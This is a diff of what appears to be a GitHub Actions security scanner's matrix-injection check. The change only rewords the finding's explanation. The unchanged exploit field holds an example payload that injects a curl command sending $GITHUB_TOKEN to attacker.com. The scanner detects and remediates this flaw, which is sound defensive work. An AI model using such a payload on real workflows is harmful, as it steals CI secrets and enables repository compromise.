@@ -68,7 +68,7 @@ export function checkMatrixInjection(workflow, rawContent, filename) {
         line:        lineNumber,
         snippet,
         context:     `Job: \`${jobName}\`  ·  Step ${stepIndex + 1}${step.name ? ` (${step.name})` : ''}`,
-        detail:      `The job's \`strategy.matrix\` is populated from attacker-controlled event data (e.g. \`fromJSON(github.event.*)\`). The matrix values are then interpolated via \`\${{ matrix.* }}\` into a \`run:\` step. GitHub substitutes matrix values before the shell runs, so the attacker controls shell input directly.`,
+        detail:      `The job's \`strategy.matrix\` is populated from attacker-controlled event data (e.g. \`fromJSON(github.event.*)\`). Those values flow into a \`run:\` step via \`\${{ matrix.* }}\`, and GitHub substitutes them before the shell runs — so the attacker controls shell input directly.`,
         exploit:     `An attacker crafts a PR body or issue containing a matrix value like \`"; curl https://attacker.com/?t=$GITHUB_TOKEN #"\`. When the workflow expands \`\${{ matrix.target }}\` in the run step, the payload executes and exfiltrates secrets.`,
         impact:      'Matrix Injection → Remote Code Execution with Secret Access',
         remediation: `Do not use external event data in \`strategy.matrix\`. Pass matrix values through env vars so the shell does not interpret them as code:\n\nenv:\n  TARGET: \${{ matrix.target }}\nrun: echo "Building $TARGET"`,
